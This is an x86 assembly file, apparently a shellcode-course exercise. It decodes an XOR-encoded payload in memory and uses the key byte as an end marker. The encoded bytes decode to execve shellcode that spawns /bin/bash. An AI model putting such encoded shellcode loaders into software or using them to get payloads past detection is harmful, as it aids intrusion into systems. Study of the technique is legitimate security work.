;Author: Eduardo
;Filename: xor_decoder_marker.asm
;A xor encoded program which shellcode is decode in memory by using a marker to end the xor operation instead of using the length of the shellcode to be decoded.
;Generally the marker is the xor key
;

global _start

section .text
_start:

	jmp short call_decoder

decoder:

	pop esi

decode:
	xor byte [esi], 0xaa
	jz Shellcode		; if the ZF flag is setted we reached the of the shellcode
	inc esi

	jmp short decode


call_decoder:

	call decoder
	Shellcode: db 0x9b,0x6a,0xfa,0xc2,0xc8,0xcb,0xd9,0xc2,0xc2,0x85,0x85,0x85,0x85,0xc2,0x85,0xc8,0xc3,0xc4,0x23,0x49,0xfa,0x23,0x48,0xf9,0x23,0x4b,0x1a,0xa1,0x67,0x2a, 0xaa

